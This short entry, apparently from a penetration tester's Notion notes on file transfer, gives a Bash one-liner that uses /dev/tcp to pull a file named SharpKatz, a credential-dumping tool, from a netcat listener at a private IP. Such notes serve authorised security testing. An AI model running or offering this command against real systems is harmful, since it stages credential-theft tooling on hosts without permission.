# Download File /dev/tcp

OS: Linux
Description: Download a file using cat and /dev/tcp
Security Domains: File Transfer (https://www.notion.so/File-Transfer-1444c8e52376809ba2ecfc98dc62c772?pvs=21)
Target_Technology: Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21)

### Download File /dev/tcp

```jsx
cat < /dev/tcp/192.168.49.128/443 > SharpKatz.ex
(This would point at a netcat listener on port 443 on the remote machine)
```
